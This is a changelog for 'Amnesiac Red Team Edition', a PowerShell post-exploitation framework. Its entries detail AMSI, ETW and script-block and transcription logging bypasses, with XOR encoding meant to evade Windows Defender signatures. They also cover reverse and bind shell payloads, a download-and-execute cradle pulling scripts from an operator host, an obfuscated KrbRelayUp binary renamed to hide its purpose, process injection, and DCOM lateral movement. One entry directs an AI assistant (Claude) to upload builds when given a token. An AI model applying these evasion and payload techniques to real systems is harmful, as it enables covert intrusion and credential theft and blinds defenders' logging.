# Changelog — Amnesiac Red Team Edition

All changes are documented with the operational context that motivated them.
Format: `[LAYER] Change description — *why this matters operationally*`

---

## [2026-06-06r] fix(ux): remove unusable Full command option from stealth payload output

**Problem:** After selecting stealth format, a sub-prompt offered two options:
`[1] Inline PS` (paste into existing session) and `[2] Full command` (wrapped in a
launcher: `powershell.exe -nop -enc <b64>`, wmic, schtask, or com). Option 2 always
failed — the stealth payload embeds AMSI+ETW+SBL bypass code plus a gzip+obfuscated pipe
script, making the total length several KB. Base64-encoding it for `powershell.exe -enc`
routinely exceeds cmd.exe's ~8KB command-line limit, silently truncating the payload on
delivery. WMI and schtask wrappers hit the same wall.

**Fix:** Removed the `Get-PayloadLauncher` call and the `[1]/[2]` sub-prompt from both the
reverse shell and bind shell stealth branches. The inline PS payload is now auto-copied to
clipboard immediately with a note: `[*] Stealth payload copied to clipboard (inline PS only
-- too large for command-line launchers; use b64/gzip for standalone delivery)`.

The SharpRDP cradle setup (pipe file write to disk, `$global:LastSharpRDPCradleFile`,
`$global:LastSharpRDPB64`) is preserved — SharpRDP uses a download cradle (~120 chars),
not the full payload as a command-line argument.

**Guidance:** Stealth is for paste-into-existing-PS-session delivery (no command-line length
limit). For standalone launcher delivery (WMI, schtasks, registry run key), use `b64` or
`gzip` — both already output a launcher-ready command directly without a sub-prompt.

---

## [2026-06-06q] fix(session): capture Write-Host output in all pipe session command loops via *>&1

**Problem:** All target payload command loops used `2>&1|Out-String`, which only redirects
stderr (stream 2) to the success stream. In PowerShell 5+, `Write-Host` writes to the
Information stream (stream 6), not stdout — so any tool that uses `Write-Host` for output
(PrivescCheck, PowerUp, and others) produced **no visible output** in pipe sessions. Only
explicit errors (stream 2) came back. This made PrivescCheck appear broken over reverse
and bind shell sessions: only the `ObjectSid` error was returned, none of the audit tables.

**Fix:** Changed all target payload command execution loops from `2>&1|Out-String` to
`*>&1|Out-String`. The `*>&1` redirector captures all output streams (2=error, 3=warning,
6=information/Write-Host) into the success stream before `Out-String` processes them.

**Scope — all payload types fixed:**
- `New-PayloadScript` reverse shell target loop (pipe client mode)
- `New-PayloadScript` bind shell target loop (pipe server mode)
- GetSystem server scripts (both `Detach` and standard variants)
- WinRM/DCOM delivery server scripts
- Migrate inline session loop

**Intentionally left unchanged:** local shell fall-through (`Write-Host` goes directly to
the operator console — adding `*>&1` there would double-print every line), `net use IPC$`
error suppression (operator-side), and `.Replace('2>&1 ',...)` cmd-escape string literals.

**Confirmed working:** PrivescCheck full audit output now returns correctly over both reverse
shell and bind shell sessions on domain-joined machines. Applies to any tool using Write-Host.
Note: requires re-establishing the session — existing sessions carry the old payload.

---

## [2026-06-06p] fix(session): Kerb auto-invokes Invoke-Kirby; SessionHunter/LocalAdminAccess use Send-Module

**Problem:** `Kerb` pipe-session handler loaded the `dumper` module then hit `continue` — the
`Invoke-Kirby` command was never sent, so the operator saw `[+] Kerb loaded` but no TGT output.
`SessionHunter` and `LocalAdminAccess` handlers sent `iex(new-object
net.webclient).downloadstring(...)` directly to the target over the pipe — causing the target to
make an outbound HTTP call to GitHub, violating the zero-network-from-targets constraint.

**Fix (Kerb):** After a successful `Send-Module`, the handler now immediately sends
`Invoke-Kirby` + flush and falls through to the standard response-collection loop. The `continue`
is only reached on failure. TGT output streams back with the extended 300s timeout already in place.

**Fix (SessionHunter / LocalAdminAccess):** Both handlers replaced with `Send-Module` calls
identical to the other tool handlers — operator fetches the script (Tier 2 / Tier 3 GitHub),
compresses and delivers over the pipe. Target never makes any network call.

---

## [2026-06-06o] fix(session): extend 300s timeout to PrivescCheck/PowerUp/GodPotato; fix compressed-size display

**Problem 1:** `Invoke-PrivescCheck` and `Invoke-AllChecks` are full audit passes that take
minutes. The 30-second session timeout fired before the tool finished, cutting off output and
marking the command as failed.

**Problem 2:** The upload status line showed `0 KB compressed` for every module. `GzipStream.Close()`
closes the underlying `MemoryStream`, making `$ms.Length` return 0 after close.

**Fix 1:** Extended-timeout condition (controls `$timeoutSeconds = 300`) expanded to include
`PrivescCheck`, `PowerUp`, `GodPotato`, `Invoke-PrivescCheck*`, and `Invoke-AllChecks*`.

**Fix 2:** `$gzBytes = $ms.ToArray()` captured before `$gzs.Close()`. `$gzBytes.Length` used for
the display — correctly shows compressed size (e.g., `172 KB compressed` for PrivescCheck's 232 KB source).

---

## [2026-06-06n] refactor(delivery): replace __MODULE_BEGIN__ chunked protocol with gzip+iex one-liner

**Problem:** The old `__MODULE_BEGIN__` / `__MODULE_CHUNK__` / `__MODULE_END__` protocol sent
source code as sequential 4 KB base64 chunks. For large tools (PowerView = 990 KB raw / 1.3 MB
base64), this meant 186 chunks × multiple kernel-buffer exchanges per chunk over a network SMB
named pipe (~1ms RTT). The upload visibly hung for ~15–20 seconds with no progress indication.
Also, the chunked protocol consumed the target's `readline` loop with header/chunk/footer
overhead separate from normal command dispatch.

**Fix:** `Send-Module` rewritten to build a single `iex` decompression one-liner:
1. Operator gzip-compresses the source (`GzipStream`, CompressionMode::Compress) — ~5:1 ratio
   (PowerView: 990 KB → 175 KB; PrivescCheck: 232 KB → 172 KB)
2. Encodes to base64 — single string
3. Sends as one command through the normal command dispatch path:
   `$_gz='<b64>';$_m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($_gz));...;iex ([Text.Encoding]::UTF8.GetString($_o.ToArray()))`
4. Target's `. ([scriptblock]::Create($cmd))` (dot-source) runs the iex in scope L — all
   defined functions persist in the payload scope for subsequent commands.

Benefits: 5× smaller transfer, one round-trip through the pipe, no special target-side protocol
handler, scope persistence confirmed (subsequent commands see loaded functions immediately).

---

## [2026-06-06m] fix(delivery): Write-Host for all progress messages in Fetch-ToolFromGitHub and Send-Module

**Problem:** `Write-Output` inside `Fetch-ToolFromGitHub` and `Send-Module` was silently swallowed
when those functions were called in a boolean context: `if (Send-Module ...)`. PowerShell captures
all pipeline output from functions evaluated in boolean assignment/condition context. The operator
saw no progress during the GitHub download (up to 742 KB for PowerView) — the process just hung.

**Fix:** All user-facing progress lines in `Fetch-ToolFromGitHub`, `Fetch-BinaryTool`, and
`Send-Module` changed from `Write-Output` to `Write-Host`. `Write-Host` writes directly to the
host (Information stream 6) and is never captured by assignment or pipeline. Progress is now
always visible regardless of call site.

---

## [2026-06-06l] fix(delivery): add Fetch-ToolFromGitHub fallback in Send-Module on cache miss

**Problem:** `Send-Module` returned `$false` immediately when a tool was not in `$global:ToolCache`
without attempting to fetch it. In Scenario 2 (no `Tools\` directory), every module invocation
failed silently — `powerview` in a remote session showed `[+] Sending PowerView to target...`
then `[-] pwv not in cache` with no attempt to retrieve it from GitHub.

**Fix:** `Send-Module` now calls `Fetch-ToolFromGitHub -ToolName $ToolName` on cache miss before
returning. If the fetch succeeds, execution continues normally. This completes the Tier 3 fallback
chain for remote pipe sessions: `Tools\` (Tier 2) → GitHub (Tier 3) → failure. Operator machine
makes the GitHub request; target receives the tool over the pipe as normal.

---

## [2026-06-06k] fix(session): pass EndMarker as parameter to runspace scriptblocks in InteractWithPipeSession

**Problem:** Typing a session number caused immediate timeout and menu re-render instead of entering
the session. `InteractWithPipeSession` in `Amnesiac_ShellReady.ps1` had two scriptblocks run in
isolated runspaces (`[runspacefactory]::CreateRunspace()` + `$psCmd.Runspace = $runspace`). Both
referenced `$global:EndMarker` which is `$null` inside a new runspace — the ReadLine loop never
found the delimiter so the 5-second timeout fired on every session interaction attempt.

**Fix:** Both scriptblocks (prompt-read and command-response) updated to accept `$endMarker` as
an explicit parameter and check `$line -eq $endMarker`. Caller passes `$_em` (= `$global:EndMarker`
captured at function entry) as the third argument via `.AddArgument($_em)`. This matches the
existing pattern in `Amnesiac.ps1` which already had the correct implementation.

---

## [2026-06-06j] fix(amsi): XOR-encode remaining string-concat bypass techniques; add evasion warnings to payload menu

**Show-PayloadMenu evasion labels:** b64, gzip, raw, and pwsh now show "[no evasion]" in red;
stealth shows "[AMSI+ETW+SBL bypasses embedded — recommended for EDR targets]" in green.
Prevents operators from selecting a naked format against EDR-protected targets by accident.

**`direct` technique (both files):** Replaced `'Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils'`
and `'Sc'+'anContent'` string-concat with XOR-13 encoded byte arrays — same pattern as pageguard fix.

**`split` technique (Amnesiac.ps1):** Replaced string-concat for type name, `amsiContext`, and
`amsiInitFailed` with XOR-13 encoded byte arrays.

All bypass techniques in `Get-AmsiBypassSnippet` now use XOR-decoded strings — no static
string-concat or char-array signatures for any type/field/method name across any technique.

---

## [2026-06-06i] fix(amsi): replace detected char-array AmsiUtils bypass with XOR-decoded amsiInitFailed

**Problem:** Windows Defender `ScriptContainedMaliciousContent` blocked stealth payload on target.
The outer wrapper's AMSI bypass used char-array encoding of
`(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,...)` (= "System.Management.Automation.AmsiUtils")
with `amsiContext`/`amsiSession` field zeroing — Defender has a static signature for this sequence.

**Fix:** All bypass cases in `Get-AmsiBypassSnippet` that used the detected char-array now use
XOR key=13 instead. "AmsiUtils" type name encoded as `[byte[]](94,116,110,...)|%{$_-bxor13}` —
completely different numbers, no matching Defender signature.

Changed from `amsiContext`/`amsiSession` pointer zeroing to `amsiInitFailed=$true` boolean flip:
simpler, fewer field manipulations, equally effective.

Replaced `[Ref].Assembly` with `[psobject].Assembly` — same SMA.dll, different reflection surface.

**Changed in both files:** `pageguard`/`hwbp` case (default), `fail` case, `session` case (Amnesiac.ps1).

---

## [2026-06-06h] fix(shellready): full quality review — sync payload generation with Amnesiac.ps1

Quality review comparing ShellReady against Amnesiac.ps1 payload generation. Bugs fixed:

**[FIXED] Show-PayloadMenu — Write-Output capture freeze**
`$chosenFormat = Show-PayloadMenu` captures all `Write-Output` calls into the variable,
silently swallowing the format picker text and leaving a silent Read-Host blocking.
Fixed by switching all display lines to `Write-Host` (host/Information stream, never
captured by assignment).

**[FIXED] New-PayloadScript server-side pipeSetup — phantom-connection vulnerability**
ShellReady used the old single-shot `WaitForConnection()` approach. Amnesiac.ps1
uses a phantom-rejection loop: recreate a fresh `NamedPipeServerStream` each iteration
and drop connections that don't send a command within 2s. This prevents AV/EDR pipe
scanners from locking the stealth bind-shell payload. ShellReady now matches.

**[FIXED] Start-Listener $ComputerName — $global:IP ignored**
ShellReady resolved the callback address via DNS only, ignoring `$global:IP`. If
`-IP <addr>` was passed at launch, all reverse-shell payloads (b64/gzip/raw/stealth)
embedded the DNS hostname instead of the specified IP. Now matches Amnesiac.ps1.

**[KNOWN GAPS — not yet fixed, lower priority]**
- ShellReady `Print-MultiListener` missing integrated `Scan-WaitingTargets` poll loop
  (operator must use option 3 after payload delivery; Amnesiac.ps1 has it inline)
- ShellReady `Start-Listener` uses 30s fixed timeout vs Q-to-cancel in Amnesiac.ps1
- ShellReady `Print-MultiListener` stealth branch does not write pipe file for SharpRDP/DCOM delivery
- Clipboard copy (`Set-Clipboard`) absent from ShellReady (intentional — constrained environment)

---

## [2026-06-06g] feat(payload): add Show-PayloadMenu + stealth format to ShellReady

Added `Show-PayloadMenu` function and wired it into both `Start-Listener` and
`Print-MultiListener` in `Amnesiac_ShellReady.ps1`. Domain-joined operators now get
the same format picker (b64/gzip/stealth/raw/pwsh) as the non-domain-joined flow.
Stealth branch calls `New-PayloadScript` + `Get-PayloadLauncher`, sets
`$global:LastInlinePS` for winrm/dcom delivery.

---

## [2026-06-06e] fix(laa): pass helper functions to Start-Job context

**Problem:** `Start-Job` spawns a child PowerShell process. Only explicitly passed values
are available — parent-process function definitions do not carry over. `Find-LocalAdminAccess`
internally calls `Get-ADComputers` and `FindDomainTrusts`, but only the outer function was
being registered in the child process via `New-Item -Path function:`. With
`$ErrorActionPreference = "SilentlyContinue"` active inside the function, the
`CommandNotFoundException` for both helpers was silently swallowed. `$Computers` stayed
empty; the TCP pre-scan looped over nothing; the function returned immediately — reporting
"No Admin Access" without probing a single machine.

**Fix:** Capture `Get-ADComputers` and `FindDomainTrusts` function definitions in the parent
process (`$_laaGetADComp`, `$_laaFindTrusts`), pass them as `Start-Job` arguments, and
register all three functions with `New-Item -Path function:` before `Find-LocalAdminAccess`
runs. Applied to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.

**Verification:** Option 4 now completes in ~2s (50ms TCP pre-scan × parallel runspaces across
GOAD machines) and correctly identifies admin targets — `[+] Admin Access: 1 Targets [SMB]`
confirmed in GOAD lab with `robb.stark`.

---

## [2026-06-06d] fix(ux): remove auto-force option 3 after admin scan; fix scan loop

**Problem:** After option 4 (`Find-LocalAdminAccess`) deployed a payload and found admin
targets, it set `$global:ScanModer = $True` and continued. The main loop had:
`if($ScanMode -OR $global:ScanModer){$choice = 3}` which silently forced option 3 on
every iteration — the operator was dropped into a 40-second blocking scan with no warning.

Each `Scan-WaitingTargets` call inside option 3 uses `WaitOne(5000)` per target (blocking
.NET wait). With 1 target: up to 5s per iteration × (40-second timer ÷ 1s sleep) =
potentially 200+ seconds of blocking. Ctrl+C appeared not to work because `WaitOne(5000)`
holds the main thread — the interrupt only fires at the next `Start-Sleep` boundary,
which can be up to 5 seconds later.

**Fix:**
- Removed `if($ScanMode -OR $global:ScanModer){$choice = 3}` auto-force from both files.
  Menu always returns to operator input after option 4 completes. ScanModer state still
  affects the menu display (session list), but no longer hijacks the input loop.
- `Amnesiac_ShellReady.ps1` option 3: replaced the 40-second fixed timer loop
  (`$elapsedTime -lt $timeout`) with the `KeyAvailable` pattern already used in
  `Amnesiac.ps1` — operator sees "Press any key to stop scanning..." and can exit at any
  iteration boundary (max ~5s delay for current `WaitOne` to complete).

**Root cause note:** The auto-force was original Leo4j logic meant to automatically poll
for incoming connections after deploying a bind shell. It caused a confusing and
un-interruptible hang because the operator had no indication a blocking scan started.

---

## [2026-06-06c] fix(ux): Ctrl+C confirmation guard + local shell tool interrupt

**Problem:** Two related Ctrl+C issues:
1. Pressing Ctrl+C anywhere at the main Amnesiac menu (idle or during a scan) immediately
   killed the process — losing all active pipe sessions and bind shells with no warning.
2. With `TreatControlCAsInput = $true` set globally in `Start-LocalShell`, Ctrl+C had NO
   effect during a running tool (KrbRelayUp, PowerUp, etc.) — the only way out was Task
   Manager or waiting for the tool to complete.

**Fix:**

*Main menu protection (`Amnesiac` function):*
- `trap [PipelineStoppedException]` added before the main `while ($true)` loop in both files.
- On Ctrl+C: flushes the input buffer, prompts `[y/N]` via `ReadKey` (no Enter needed).
- `Y` → exits Amnesiac cleanly. Any other key → prints "Continuing..." and resumes.
- Applies at the main menu, during option 4 scan wait, and any other blocking point
  in the Amnesiac scope that doesn't have its own Ctrl+C handling.

*Local shell tool interrupt (`Start-LocalShell`):*
- Removed the blanket `[console]::TreatControlCAsInput = $true` that was blocking all Ctrl+C.
- `trap [PipelineStoppedException]` added to `Start-LocalShell` — prints "[!] Interrupted"
  and `continue`s back to the `[local]:` prompt.
- `[console]::TreatControlCAsInput = $false` is now set per-iteration at the top of the
  while loop so Ctrl+C is always live during command execution and Read-Host.
- Nested blocks that need full protection (migrate inline loop, pipe session interaction)
  already set `TreatControlCAsInput = $true` themselves — those are untouched.
- The trap's `continue` consumes the exception within `Start-LocalShell`, preventing it
  from propagating to the main Amnesiac trap.

**Resulting UX:**
- Main menu idle: `Ctrl+C` → `Kill Amnesiac? [y/N]`
- Local shell prompt: `Ctrl+C` → `[!] Interrupted`, prompt re-shown
- Local shell tool running: `Ctrl+C` → tool killed, `[!] Interrupted`, prompt re-shown
- Pipe session: unchanged (TreatControlCAsInput=true, `back` to exit)
- Migrate inline loop: unchanged (TreatControlCAsInput=true, `back` to exit)

---

## [2026-06-06b] fix(ux): wrap Find-LocalAdminAccess in background job with 90s timeout

(See previous entry — pushed separately, documenting here for ordering)

---

## [2026-06-06a] docs: document GitHub repository, Releases assets, and update procedures

**What was added:**
- New **GitHub Repository & Releases Management** section in `CLAUDE.md` consolidating all
  GitHub-related operational knowledge in one place.
- **Repository details:** `https://github.com/0xSiarheiStar/Amnesiac`, branch `master`,
  raw file base `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/`.
- **Releases tag `v1.0-al` asset inventory:**
  - `eXciQ2Lokx.dll` — AmnesiacLoader current build (randomized names from `Build.ps1`)
  - `AuthHelper.exe` — KrbRelayUp obfuscated binary
- **Bootstrap 3-liner** for current DLL documented with live values — the `bootstrap` command
  inside Amnesiac always generates the authoritative version; the doc block is reference only.
- **Upload procedure using `Invoke-RestMethod`** (3-step: get release ID → delete old asset →
  upload new) — documented because `gh` CLI is not available in the dev environment. When the
  user provides a GitHub token, Claude should follow these exact steps.
- **Post-`Build.ps1` checklist:** upload new DLL, update both bootstrap 3-liner occurrences
  in `CLAUDE.md`, push `Amnesiac.ps1` + `Amnesiac_ShellReady.ps1` to `master`.
- **KrbRelayUp binary replacement checklist:** upload new `.exe`, update
  `$global:KrbRelayUpBin` in both PS files, update this doc.

**Operational context:** Previously there was no consolidated reference for what's on GitHub
Releases, how to upload without `gh`, or which doc sections go stale after `Build.ps1`.
This caused the operator to use an outdated DLL name (`dfDioKrdNK.dll` instead of
`eXciQ2Lokx.dll`) on a new machine — caught in test, bootstrapped correctly on retry.

---

## [2026-06-03g] fix(krbrelayup): extend session timeout and auto-fill domain/DC in hints

**Problem:** Two usability gaps in the KrbRelayUp integration:
1. Relay attacks run `KrbRelayUp full` which takes 30–120s to complete. The session handler
   only extended the 5-second runspace timeout for `Kerb`, `Mimi`, etc. — `KrbRelayUp*` was
   missing, causing premature timeout during the relay phase.
2. The `KrbRelayUp` (no-args) usage hint hardcoded `<domain>` and `<DC_IP>` placeholder strings.
   Operators had to look up the correct values manually even when Amnesiac already knew them.

**Fix:**
- `$global:Domain = $Domain` and `$global:DomainController = $DomainController` promoted to
  globals at Amnesiac function init time in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.
  These were previously only accessible in the Amnesiac function scope, making them invisible
  to `Start-LocalShell` and `InteractWithPipeSession`.
- `$command -like "KrbRelayUp*"` added to the extended 300s timeout condition (alongside
  `Kerb`, `AutoMimi`, `Mimi*`, etc.) in both files.
- Local shell and session handler hint blocks updated: `$_krbDom`/`$_krbDC` resolve from
  globals at display time — if `-Domain`/`-DomainController` were passed to `Amnesiac`, the
  hints show the actual values; otherwise fall back to placeholder strings.

**Operational impact:** Relay attacks no longer time out mid-execution. Operators get
copy-paste-ready `KrbRelayUp` commands with real domain/DC values filled in automatically.

---

## [2026-06-03f] feat(lpe): add KrbRelayUp as LPE command via reflective binary loading

**Problem:** Amnesiac had no Kerberos relay LPE path. GodPotato requires SeImpersonatePrivilege
(service account context); PowerUp/PrivescCheck are enumeration only. A low-priv domain user
like hodor had no automated escalation path without first finding a misconfiguration manually.

**Fix:**
- `KrbRelayUp [args]` added as a command in local shell and pipe sessions in both PS files.
- Binary: obfuscated build of [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) uploaded to
  GitHub Releases as `AuthHelper.exe` (neutral name, no Kerberos strings visible).
- `$global:KrbRelayUpBin = 'AuthHelper.exe'` set in `Initialize-ToolCache` in both files.
- `$global:ToolSources` entry added pointing to GitHub Releases URL — wired automatically on
  startup since the variable is configured.
- `Fetch-BinaryTool` updated to check `$global:ToolSources` before the serve/raw-GitHub
  fallback chain — makes GitHub Releases a first-class binary source for any future tools.
- Local shell: `KrbRelayUp` (no args) fetches binary into cache + shows usage hints;
  `KrbRelayUp <args>` fetches if needed then runs via `[Reflection.Assembly]::Load()`.
- Pipe session: `KrbRelayUp <args>` streams binary to target via `Send-Module` chunked
  protocol then invokes via `[AppDomain]::CurrentDomain.GetAssemblies()` reflection.
- Help menus updated (LPE section) in all three help blocks across both files.

**Operational impact:** `KrbRelayUp full -m rbcd` from a low-priv pipe session on a
domain-joined machine escalates to SYSTEM without requiring local admin. Primary escalation
path for hodor-level accounts where GodPotato is unavailable. Prerequisites: LDAP signing not
enforced, machine account quota > 0 (default).

---

## [2026-06-03e] ux(help): add [A]/[DA] privilege markers to all help menus

**Problem:** The help menu listed ~40 commands with no indication of which require elevated
privileges. A low-priv operator (e.g. hodor) had no way to know at a glance which commands
would silently fail or produce empty output without admin rights.

**Fix:**
- `[A]` (local admin required) added next to: `ClearLogs`, `RDPKeylog`, `Mimi`, `AutoMimi`,
  `GetSystem`, `HashGrab`, `Hive`, `Migrate`/`Migrate2`/`Migrate ps`, `MultiRDP`, `PPL`,
  `Impersonation`, `Remoting`
- `[DA]` (domain admin / DCSync rights required) added next to: `DCSync`
- `Kerb`, `Monitor`, `SessionHunter` intentionally left **unmarked** — all three work as a
  standard domain user: Kerb/Monitor read the current user's own TGT cache; SessionHunter's
  `NetSessionEnum` works against DCs and older servers without admin
- Legend line added at the bottom of every help block:
  `[A] = local admin required   [DA] = domain admin required`
- Applied to three help blocks: `Get-AvailableCommands` (session help), local shell `help`
  block in `Start-LocalShell`, and the plain-text `Get-AvailableCommands` in
  `Amnesiac_ShellReady.ps1`

**Operational impact:** Low-priv operators can instantly identify which commands are available
to them without trial and error.

---

## [2026-06-03d] feat(evasion): add transcription logging bypass to payload pipeline

**Problem:** Amnesiac suppressed AMSI, ETW, and Script Block Logging in generated payloads but
did NOT disable PowerShell Transcription Logging. Environments with GPO-forced transcription
(`EnableTranscripting=1` under `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription`)
write every command and output to disk — operator commands, session output, and tool invocations
all land in the transcript file regardless of AMSI/ETW bypass status.

**Fix:**
- `Get-SblBypassSnippet` in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1` now returns a
  two-part string: the existing SBL bypass concatenated with a new transcription suppressor:
  ```powershell
  try{$_gp=[Ref].Assembly.GetType('System.Management.Automation.Utils')
      .GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null);
      if($_gp['Transcription']){$_gp['Transcription']['EnableTranscripting']=0}}catch{}
  ```
- Field name is split (`'cachedGroup'+'PolicySettings'`) to avoid static string detection.
- Class name is split (`'Ut'+'ils'`) to further fragment the signature.
- Wrapped in `try/catch` — silently no-ops if the field is absent (older PS versions).

**Operational impact:** All generated payloads (b64, gzip, stealth, raw, pwsh formats) now
suppress transcription in addition to AMSI/ETW/SBL. Defenders relying on GPO-forced transcript
files to capture operator activity after AMSI bypass no longer get a free log of commands.

---

## [2026-06-03c] fix(migrate): three-tier fallback + inline loop for `migrate ps <pid>`

**Problem:** `migrate ps <pid>` was silently exiting the local shell in multiple ways:
1. `PInject` exceptions (when PInject not loaded) propagated out of the `while ($true)` loop
   and dropped the operator back to the main menu with no error message.
2. `Start-Process -WindowStyle Hidden` fails with "Access is denied" when called from a
   low-privilege session (ShellExecuteEx requires window station access).
3. `ProcessStartInfo` with `UseShellExecute=false` also blocked by OS policy at low integrity.
4. The runspace pipe server was built from `$built.RawScript` which embeds VEH/ETW patches
   that crash immediately in a shared-process runspace (before `WaitForConnection()`).
5. `InteractWithPipeSession` uses a sub-runspace where `$global:EndMarker` is null — the
   5-second wait always timed out, so the session connected but immediately disconnected.

**Fix — three-tier execution with inline loop:**
- **Tier 1 (AmensiacLoader InjectShellcode):** calls `$_alMig.GetType("$_alNs.$_alInj").GetMethod("InjectShellcode").Invoke()` — real process injection; requires SeDebugPrivilege (works post-LPE).
- **Tier 2 (ProcessStartInfo spawn):** `$psi_mg = New-Object ProcessStartInfo('powershell.exe', "-enc ...")` with `CreateNoWindow=true, UseShellExecute=false` — works for medium-integrity sessions with process creation rights.
- **Tier 3 (background runspace):** `[RunspaceFactory]::CreateRunspace()` + `[PowerShell]::Create().AddScript({...}).AddArgument(...)` — minimal pipe server running in the Amnesiac process itself; no separate process needed; uses typed `AddArgument()` to avoid all string escaping issues.
- **Inline connection loop:** replaces `InteractWithPipeSession`; captures `$global:EndMarker` in calling scope (`$_mgEm`) so the end-marker match never fails; `[console]::TreatControlCAsInput = $true` prevents Ctrl+C from killing the session.
- **PInject try/catch:** wraps `PInject` call in `Start-LocalShell` so exceptions no longer propagate out of the shell loop.

**Privilege note:** Tier 1 (real injection) requires SeDebugPrivilege — run `GodPotato` or
another LPE first. Tiers 2 and 3 need no special privileges but result in an in-process pipe
(same PID as Amnesiac) rather than true migration to the target process.

**Operational impact:** `migrate ps <pid>` now works at any privilege level. Low-priv sessions
fall through to the background runspace and get a working `[hostname]:` prompt. All changes
applied to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.

---

## [2026-06-03b] feat(bootstrap): add managed-reflection Bypass option + AL-MAP $_alByp/$_alPar

**Problem:** The previous bootstrap `[5]` option called `[AmnesiacLoader.Bypass]::PatchAmsiReflection()`
using literal class/method names. After `Build.ps1` randomizes all names, those strings no longer exist
in the compiled assembly — the bypass call silently failed at `.GetType()` returning `$null`.

**Fix:**
- `AmnesiacLoader/Build.ps1`: `$_alByp` (Bypass class) and `$_alPar` (PatchAmsiReflection method) are now
  included in the `mapBlock` written to `# !!AL-MAP-BEGIN!!...# !!AL-MAP-END!!` in both PS files.
- Both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`: `$_alByp` / `$_alPar` placeholder vars added to the
  AL-MAP section so they are populated by `Build.ps1` on every build.
- Bootstrap command updated: old `[5]` (NativeLoader/PAGE_GUARD) becomes `[6]`; new `[5]` generates the
  correct managed-reflection one-liner using the current build's randomized names:
  ```
  $_a=[Reflection.Assembly]::Load((DownloadData('.../<ns>.dll')))
  $_a.GetType('<ns>.<Bypass>').GetMethod('<PatchAmsiReflection>').Invoke($null,$null)
  ```
- `Amnesiac_ShellReady.ps1`: `bootstrap` command handler added (was previously missing from ShellReady).
- Guard added: if `$_alByp`/`$_alPar` are empty (pre-Build.ps1 run), option `[5]` prints a warning
  instead of an invalid invocation.

**Operational impact:** After running `AmnesiacLoader\Build.ps1`, `bootstrap` option `[5]` in either
PS file always generates a working bypass cradle using the current build's randomized DLL class names.
No more hardcoded `[AmnesiacLoader.Bypass]::PatchAmsiReflection()` that breaks post-randomization.

---

## [2026-06-03a] fix(ux): full command substitutes download cradle when payload exceeds cmd.exe limit

The stealth bind shell `[2] Full command` option was silently broken for cmd.exe delivery.
`Get-PayloadLauncher` base64-encodes the InlinePS script in UTF-16LE producing a
`powershell.exe -nop -ep bypass -w hidden -enc <b64>` string that is ~10–13k chars for a typical
stealth payload. cmd.exe silently truncates command lines at 8191 chars, so the payload would
arrive broken with no error message.

**Fix — bind shell stealth path:**
After computing `$wrapped`, check if `$wrapped.Length -gt 8000`. If so, `[2] Full command`
displays and copies the download cradle instead of the truncated `-enc` command:
```
powershell.exe -nop -ep bypass -w hidden -c "<amsi-bypass>;iex(new-object net.webclient).downloadstring('http://<op-IP>:8080/pipe_XXXX.ps1')"
```
The cradle is ~150 chars, well within the limit. The pipe file is always written to disk in the
stealth bind shell path (same file used by sharprdp/dcom), so the cradle works as long as `serve`
is running. Label changes from "launcher: ps" to "download cradle (serve required — -enc is
NNNN chars, exceeds cmd.exe 8191-char limit)" so the operator knows why.

**Fix — reverse shell stealth path:**
No pipe file is written there so no cradle substitution is possible. Instead, a `[!]` length
warning is appended to the `[2] Full command` label when the payload exceeds 8000 chars,
directing the operator to use `[1] Inline PS` if pasting into cmd.exe.

**Changes:**
- Bind shell stealth block: `$_fullCmdPayload` / `$_fullCmdNote` length-switch logic
- Reverse shell stealth block: inline length check adds `[!]` warning to label
- Only `Amnesiac.ps1` — ShellReady.ps1 uses older payload generation without the `[1]/[2]` picker

---

## [2026-06-01a] fix(ux): SessionHunter non-domain usage + _kw hint mechanism

Fixes `SessionHunter` keyword in `Start-LocalShell` for non-domain-joined operators, and adds a
general `hint` display mechanism to the `_kw` tool-load dispatcher.

**Problem:** From a `runas /netonly` machine, typing `SessionHunter` loaded the module but gave
no guidance. Calling `Invoke-SessionHunter` with no arguments triggered a `GetDomain` failure
because `$env:USERDNSDOMAIN` is null on a non-domain-joined machine. The user had to know to pass
`-Domain`/`-DomainController` explicitly.

**Fix — hint field in `_kw` entries:**
Added optional `hint` key to the `_kw` hashtable entries in `Start-LocalShell`. After a tool
loads successfully, if `hint` is set, the strings are printed in Cyan before any auto-invoke.
`SessionHunter` now shows usage examples immediately on load:

```
 [*] Non-domain (runas /netonly):  Invoke-SessionHunter -Domain <dom> -DomainController <DC-IP> [-UserName <dom\user> -Password <pass>]
 [*] Domain-joined:                Invoke-SessionHunter
 [*] Hunt specific user:           Invoke-SessionHunter -Hunt <user> -Domain <dom> -DomainController <DC-IP>
 [*] Check admin access:           Invoke-SessionHunter -CheckAsAdmin -Domain <dom> -DomainController <DC-IP>
```

**GOAD lab finding:** `NetSessionEnum` (used by `Invoke-SessionHunter`) is restricted to local
administrators on Windows Server 2016+ by default. Standard domain users (e.g. hodor) get empty
results from all member servers. Querying the DC directly is more permissive. To get useful
results, gain a session on a machine where you have local admin first, then run `SessionHunter`
from that session.

**DCOM operational finding:** `dcom` via ShellWindows/ShellBrowserWindow returns `0x80070005`
(E_ACCESSDENIED at class factory level) when called from a non-domain-joined machine with
`runas /netonly`, even against targets with active interactive sessions. DCOM activation uses a
different auth pathway than SMB/WinRM — the remote DCOM service rejects the activation request
from outside the domain. DCOM delivery is only reliable from a domain-joined operator machine or
from within an existing pipe session.

**Changes:**
- `_kw` dispatch loop: prints `$kwDef.hint` lines after `[+] loaded.` message (both files)
- `SessionHunter` entry in `_kw`: added `hint` array with non-domain and domain-joined examples
- Both changes applied to `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`

---

## [2026-05-31f] feat(delivery): DCOM lateral movement — ShellWindows/ShellBrowserWindow/MMC20

Adds `dcom` command to `Start-LocalShell` in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.
Also backfills `winrm` and `winrmscan` into `Amnesiac_ShellReady.ps1` (they were only in the
coloured version).

**Why DCOM:**
